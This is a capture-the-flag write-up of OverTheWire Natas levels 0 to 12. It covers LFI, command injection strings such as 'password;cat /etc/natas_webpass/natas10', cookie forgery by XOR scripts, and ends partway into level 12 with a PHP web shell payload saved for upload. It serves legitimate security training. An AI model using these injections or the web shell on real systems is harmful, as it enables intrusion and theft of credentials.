I will be solving the Natas Labs from OverTheWire. OverTheWire is a platform that can help you learn and practice security concepts in the form of fun-filled games.

PS: As I keep solving the labs, I'll be adding them to this writeup

Lets get started


# Level 0

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8db0502f-7e0c-4055-a754-7b15db9a8598)

Navigating to the webpage using the username and password provided

username:```natas0```          password:```natas0```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3acaf2bd-157c-4580-808b-e075e98350e4)

Viewing the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49879ba8-ec1e-4bcb-80c5-88f7b6065111)

We found the password for the next level.



# Level 1

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f3c6dac-8014-4e32-a44e-c8c83a746ca0)

Navigating to the webpage and using the password we got from the previous level

username:```natas1```            password:```g9D9cREhslqBKtcA2uocGHPfMZVzeFK6```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/722e7670-42e3-478f-be2d-35bae9a46d80)

Rightclicking has been blocked, this means we can't rightclick on the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dbb3f81-a213-4381-a495-83092c4ba523)

To view the source page, you can use ```ctrl + u``` 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58bdebd5-4fc0-45d5-af47-86bb6221c9d7)

cool, we found the password to the next level😎



# Level 2

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a4593d92-45be-463b-9d0f-66c4018cba35)

Navigating to the webpage and using the password we got from the previous level

username:```natas2```                password:```h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e3d6602e-5b49-4b91-9d25-b9751903c9fb)

Checking the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6a392a9b-209f-461e-9628-6b1e601a4831)

 From the above screenshot, you see this ```<img src="files/pixel.png">```.

This is a png image, this means the image is located in the url ```http://natas2.natas.labs.overthewire.org/files/pixel.png```, what if we were to go back a directory, we would then have ```http://natas2.natas.labs.overthewire.org/files```. Navigating to the webpage, you have this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2c0cc6d8-6224-4e06-a1d1-c9bcc114b1f9)

Viewing the ```users.txt``` file,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f11fc2a-92c5-4a0f-86f1-e176b2286748)

We have the password for the next level.



# Level 3

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0c6847f0-a5db-46a3-95df-40ccd09a327e)

Navigating to the webpage and using the password we got from the previous level

username:```natas3```        password:```G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b375b0b-ff94-45d7-bf95-4267fbceb35a)

Viewing the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/431bf817-d077-4be5-96b8-46a4c9863a0d)

Now that was a bold statement😂.

Well, navigating to the ```/robots.txt``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/74a98d89-ec44-41f5-b134-8e366b0979df)

Navigating to the ```/s3cr3t/``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b60e187-76a5-4441-a4b4-180d9b093c00)

Lets check out the ```users.txt``` file.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/159b1194-5fef-4980-839c-b232717226af)

cool, we got the password for the next level.



# Level 4

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a81cdd7a-1cba-47f9-b407-dd34b3fc70b8)

Navigating to the webpage and using the password we got from the previous level

username:```natas4```            password:```tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b1d174f-9d29-420c-871b-6a1e26d58087)

To access the website successfully, we need to ensure that you are visiting it from the specified URL.

To do this, we'll try to modify our request to include the correct source url.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e5b9515-9c6c-46de-8d4f-c3bc36b283b6)

We'll be using the "Referer" header here

<font color="green">The Referer header in an HTTP request provides information about the URL of the previous webpage that linked to the current page. It helps websites and servers track the origin of incoming traffic and understand how users navigate through different webpages.</font>

Modifying our request,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/374c7456-fc44-437c-92c1-fc2b4d008bbf)

Cool, we found the passowrd for the next level.



# Level 5

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e3413fc-d301-45c8-9d61-59fdcd26954d)

Navigating to the webpage and using the password we found in the previous level

username:```natas5```          password:```Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4eb4c242-7337-4751-b27c-5c6b61b36d43)

It is saying here that we are not logged in. Lets capture the request using burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb0e5685-de9f-483a-b023-ff9d83baee42)

Looking at the captured request again;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b62aa7a9-8a8e-4de2-bc4e-87f25e55286b)

For the cookie header, you see that ```loggedin``` has a value of ```0```. 

What happens when we change that value to ```1```??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/efa40c80-31b3-44bc-a5e4-d3e4dd747084)

cool, we got the password for the next level😎



# Level 6

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f149d3fc-8764-4fbf-89ef-747cb403047e)

Navigating to the webpage and using the password we found in the previous level

username:```natas6```        password:```fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/67486b51-ad4c-4d7a-a814-499b3373467c)

We are asked to provide a secret.

Well, let me try this secret, be sure not to tell anybody hehe. **_I am spiderman_**, inputting that secret

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28b5e367-891a-4d3d-9814-f33b9a084a37)

As you can see we got an error message.

Viewing the source page;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40147890-6d1a-4e77-af75-b130580eddf6)

We got this php code

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
Explaining the code
```
1.It includes the contents of the file "includes/secret.inc" using the include statement. This allows the code to access variables or functions defined in that file.
2.It checks if the "submit" key exists in the $_POST superglobal array, indicating that a form has been submitted via the HTTP POST method.
3.If the "submit" key exists, it compares the value of the $secret variable with the value of the 'secret' field submitted through the form ($_POST['secret']).
4.If the values match, it prints the message "Access granted. The password for natas7 is <censored>". This suggests that upon successful submission of the correct secret, it reveals the password for the "natas7" user.
5.If the values do not match, it prints the message "Wrong secret", indicating that the submitted secret is incorrect.
```
Now, lets navigate to the directory ```/includes/secret.inc```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b77b9b19-8ebe-4d67-b153-a71cf7d4c413)

oops, a blank page😰

Viweing the page source;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/257b747b-0c4f-468a-b99b-093734846546)

We found our secret hehe, submitting the secret should get us the password for the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6d51558-b97f-42a4-bad0-62418c6c5460)

Cool, we found the password for the next level



# Level 7

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f3c4572-4128-47cc-857d-d5c4cba090f9)

Navigating to the webpage and using the password we got from the previous level

username:```natas7```          password:```jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e0fd5cf-de9a-40e8-b6c6-9e4afe847a8c)

Viewing the page source;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50880754-c635-44cf-bf38-88d2b9ade22d)

We got a hint saying the password for the next level is in ```etc/natas_webpass/natas8```

Going back to the webpage and clicking on ```Home```,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aae0a694-6f55-4a0a-9c87-0cf3b93bf9e2)

From the url we can tell that there's a possible LFI (Local File Inclusion) vulnerability, which can enable us to read files.

Lets try to read the ```/etc/passwd``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/963582a6-bd83-45f4-a2c4-b5ffae665de9)

cool stuff😎

Now, using the hint they gave us earlier, lets get the  password for the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7765c1c9-9a77-42da-8c42-9bf1998ab648)

Nice, we got the password for the next level



# Level 8

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e48f580b-f5cc-440b-8ddd-153c0090fc1d)

Navigating to the webpage and using the password we got from the previous level

username:```natas8```          password:```a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/da44f7dc-dd4b-4b3c-9ede-b4ce3f3fd07d)

Viewing the source page I got this php code

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Explaining the code
```
1. The encoded secret is stored in the variable $encodedSecret. It is a hexadecimal representation of the original secret.
2. The function encodeSecret($secret) is defined. This function takes a secret as input, performs three operations on it, and returns the result.
   a. The secret is base64 encoded using base64_encode($secret).
   b. The resulting base64 string is reversed using strrev().
   c. The reversed string is converted to its hexadecimal representation using bin2hex().
3. The code checks whether the form has been submitted (array_key_exists("submit", $_POST)). It assumes that there is an HTML form with an input field named "secret" and a submit button.
4. If the form has been submitted, the code compares the encoded secret generated from the submitted secret with the original encoded secret (encodeSecret($_POST['secret']) == $encodedSecret).
5. If the comparison is true, it prints the message "Access granted. The password for natas9 is <censored>," where <censored> indicates that the password is intentionally hidden.
6. If the comparison is false, it prints the message "Wrong secret."
```
Taking the encodedsecret ```3d3d516343746d4d6d6c315669563362```, since it is hex encoded, lets decode it using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/19a19f4b-dcd1-47c0-b03c-413e4cf5a7c9)

Now, we'll try to use the ```strrev()``` function to reverse the base64 we got. For this we'll use a python script

```python
import base64

def reverse_base64(encoded_base64):

    # Step 1: Reverse the decoded bytes
    reversed_bytes = encoded_base64[::-1]

    # Step 2: Decode the Base64 string
    decoded_bytes = base64.b64decode(reversed_bytes)

    # Step 3: Encode the reversed bytes back to Base64
    reversed_base64 = base64.b64encode(decoded_bytes).decode()

    return reversed_base64

# Example usage
encoded_base64 = "==QcCtmMml1ViV3b"
reversed_base64 = reverse_base64(encoded_base64)
print(reversed_base64)
```
After running the script, you should get this

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ python abeg.py
b3ViV1lmMmtCcQ==
```
Now, lets go ahead and decode this base64

command:```echo "b3ViV1lmMmtCcQ==" | base64 -d```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ echo "b3ViV1lmMmtCcQ==" | base64 -d
oubWYf2kBq
```
Applying the output we got as the secret, that is ```oubWYf2kBq```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1aacba88-da8a-4f30-874d-74db1c62769f)

Cool, we got the password for the next level



# Level 9

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/72ae6eda-8264-4dff-be2c-244a40c8b5e9)

Navigating to the webpage and using the password we got from the previous level

username:```natas9```       password:```Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b3047805-b9f7-4bb3-ab45-52475b05243f)

Viewing the source code we get this php code

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Explaining this code
```
1. The script initializes an empty variable named $key.
2. It checks if the "needle" parameter exists in the request using array_key_exists("needle", $_REQUEST).
3. If the "needle" parameter is found, its value is assigned to the $key variable.
4. The script checks if $key is not an empty string.
5. If $key is not empty, it executes a shell command using passthru().
6. The shell command being executed is grep -i $key dictionary.txt, which searches for the value of $key (case-insensitive) in the file named "dictionary.txt".
7. If there are any matches found in the dictionary file, the results will be displayed as the output.
```
So, this basically executes our commands for us. Lets find the word "password"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/45f277e1-4341-41a1-9dde-1824a925fef5)

Now, this looks like a possible command injection vulnerability where you can pass other commands.

For example, to read the ```/etc/passwd``` file, we can use this ```password;cat/etc/passwd```, so what happens here is that the shell interprets the command as 2 separate commands, ```grep -i password``` and ```cat /etc/passwd```. The ```grep``` searches for the word password in the dictionary.txt file, while the ```cat``` command displays the content of the ```/etc/passwd``` file.

Trying it out;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3d22c56b-9740-45a1-a1bc-43ba84cc3548)

It worked, now lets try to read the password for the next level from ```/etc/natas_webpass/natas10```

command:```password;cat /etc/natas_webpass/natas10```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3734ca46-daef-4bfc-bd5d-4f626b8922f4)

Cool, we got the password for the next level.



# Level 10

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cce50b3-5aec-4d8e-aa66-0e71e891a778)

Navigating to the webpage and using the password we got from the previous level

username:```natas10```        password:```D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c47a48b-ccc2-4ba2-82cf-4e812d0a7010)

oops, they now filter characters which means it won't accept the input it did earlier.

Viewing the source code I got this php code;

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
This code is similar to the code from the previous level just that this one is more secured. It filters out special characters ```;```,```|``` or ```&```, which means we can't use it.

Now, all hope is not lost hehe😎.

Since, this filters out special characters we can go ahead to use a string

For example,to read the ```/etc/passwd``` file, we can try somthing like this ```B /etc/passwd```, what this does is that it runs the command as this ```grep -i B /etc/passwd dictionary.txt```, this command attempts to search for the string "B", in both the ```/etc/passwd``` file and the ```dictionary.txt```. You should know that if the string ```B``` isn't in the ```/etc/passwd``` file, it won't show the output. So it is more like a trial and error stuff, that is, trying the letters till you get an output

Lets try it out

command:```B /etc/passwd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7d1d9cc-67ad-4621-943e-6d2012e6f4ed)

It worked, now we can use this to read the password to use for the next level

command:```A /etc/natas_webpass/natas11```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/adf09225-b3b5-412e-987b-32b08cddec74)

Cool, we got the password for the next level.



# Level 11

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d628a915-6be4-481c-b2e1-22baa64b3b6a)

Navigating to the webpage and making use of the password we found in the previous level

username:```natas11```     password:```1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dd87656-2987-4672-acf4-961e82b51932)

Viewing the source code we get this php code

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

```
Explaining the code
```
1. Default values for "showpassword" and "bgcolor" are defined in an array.
2. XOR encryption function is implemented.
3. Data is loaded from a cookie, decrypted, and validated.
4. Data is saved by encrypting and encoding it as a cookie.
5. The script loads data, either from the cookie or using default values.
6. If a valid "bgcolor" is provided in the request, it updates the data.
7. The updated data is saved as a cookie.
```
Also
```php
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```
Explaining this code also
```
1. The code sets the background color of the page based on the $data['bgcolor'] value.
2. It mentions that cookies are protected with XOR encryption.
3. If $data["showpassword"] is "yes", it prints a censored message about the password for the next level (natas12).
```
Lets first get the cookie, inspecting element

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4462b2b1-59af-4b51-8348-262cd645ffb5)

So, that's our cookie ```MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D```, Url Decoding this using [cyberchef](https://gchq.github.io/CyberChef/) should result in a base64 encoding

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea4eb80b-b742-4202-9496-4b9601610421)

Cool, we got our cookie which is ```MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=```. The next thing to do now is get the key

To get the key, we'll be using this php script

```php
<?php  

function xor_encrypt($in) {  
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}

$cookie="MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";  
  
echo xor_encrypt(base64_decode($cookie));  
  
?>
```
This script  takes a base64-encoded string ($cookie), decrypts it using XOR encryption with a predefined key, and then outputs the decrypted result

To run the script

command:```php -f key.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ php -f key.php   
KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
```
cool, we got our key which is ```KNHL```. What we'll do now is try to generate a new cookie using this key we got, during the explanation of the php codes we saw that if ```showpassword``` is set to ```yes``` then we'll get the password to the next level printed out.

To generate a new cookie we'll use this php script

```php
 <?php  
  
function xor_encrypt($in) {  
    $key = 'KNHL';  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
  
echo base64_encode(xor_encrypt(json_encode($data)));  
  
?>  
```
The script encrypts a JSON-encoded string ($data) using XOR encryption with the key "KNHL". It then base64-encodes the encrypted result and outputs the encoded string.

To run the script

command:```php -f cookie.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ php -f cookie.php
MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```
We got a new cookie, replacing the previous cookie with this new generated one should get us the password to the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/debc93dc-f596-40f5-9c95-8bd28a0cca67)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/29014e94-34ca-4165-9c53-5be04e99b8a9)

Cool, we got the password to the next level



# Level 12

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c207c032-ec6c-4552-963a-d348a1199da8)

Navigate to the webpage using the password we got from the previous level

username:```natas12```        password:```YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f5ed8743-ff02-432d-b5a4-bee40815e1ef)

Viewing the source code we get this php code

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
Explaining the code
```
1. Function genRandomString generates a random string of length 10.
2. Function makeRandomPath creates a unique random file path in a given directory with a specified extension.
3. Function makeRandomPathFromFilename generates a random file path based on a given directory and filename.
4. If the "filename" key exists in the form data:
   a. Generate a random file path using makeRandomPathFromFilename.
   b. Check if the uploaded file size exceeds 1000 bytes.
   c. If the file size is within limits, move the uploaded file to the target path.
   d. Display appropriate messages based on the success or failure of the file upload.
5. If the "filename" key doesn't exist, assume no file upload form was submitted.
```
I think we got ourselves here a file upload vulnerability

We'll try uploading a ```.php``` file, since they aren't always up to ```1kb```.

Save this payload ```<?php system($_GET[‘lol’]); ?>``` in a php file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ nano abeg.php
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ cat abeg.php 
<?php system($_GET[‘lol’]); ?>
```
Lets try to upload this and intercept using burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35408984-bdcd-491e-9ece-705399f1b335)



























    























  

